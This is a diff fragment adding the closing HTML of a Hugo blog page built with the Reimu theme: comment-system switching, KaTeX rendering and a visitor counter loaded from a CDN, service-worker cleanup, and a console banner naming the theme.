+      item.classList.add('active');
+
+      
+      const commentType = item.getAttribute('data-selector');
+
+      
+      hideAllComments();
+
+      
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          
+          changeActiveCommentItems(item);
+        });
+      }
+
+      
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script><script
+    src="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.js"
+    data-pjaxintegrity="sha384-MWNUH0WmtsYGhn2cbH6ELRCbf9LG3QDqCC&#43;gqPB3IBNO35xjZK3Ejb6oONRpDbPg" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/katex@0.16.24/dist/contrib/auto-render.min.js"
+    data-pjaxintegrity="sha384-hCXGrW6PitJEwbkoStFjeJxv&#43;fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh" crossorigin="anonymous"></script><script data-pjax>
+          var renderMath = () => {
+            if (!window.renderMathInElement) return;
+            window.renderMathInElement(_$("article"), {
+              delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "\\[", right: "\\]", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+              ],
+            });
+          };
+          if (document.readyState === "loading") {
+            document.addEventListener("DOMContentLoaded", renderMath, { once: true });
+          } else {
+            renderMath();
+          }
+        </script></div>
+</div><script
+    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
+    asyncintegrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        for (let registration of registrations) {
+          registration.unregister();
+        }
+      });
+    }
+  </script><script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script></body>
+</html>
